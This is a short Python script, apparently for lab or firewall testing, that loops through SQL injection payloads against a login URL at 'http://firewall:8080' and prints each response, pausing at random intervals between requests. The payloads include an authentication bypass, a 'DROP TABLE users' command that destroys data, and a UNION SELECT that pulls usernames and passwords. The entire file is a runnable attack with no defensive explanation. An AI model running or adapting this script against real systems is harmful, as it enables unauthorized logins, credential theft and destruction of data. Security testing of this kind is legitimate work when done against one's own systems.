import requests
import time
import random

def sql_injection_attack(base_url):
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users; --",
        "' OR id = 1; --",
        "admin' --"
    ]

    for payload in payloads:
        url = f"{base_url}/login?username={payload}&password=anything"
        try:
            response = requests.get(url)
            print(f"Attempting SQL injection: {payload}")
            print(f"Response status: {response.status_code}")
            print(f"Response content: {response.text[:100]}...")  # Print first 100 chars
        except Exception as e:
            print(f"Error occurred: {str(e)}")
        time.sleep(random.uniform(1, 3))

if __name__ == "__main__":
    base_url = "http://firewall:8080"
    sql_injection_attack(base_url)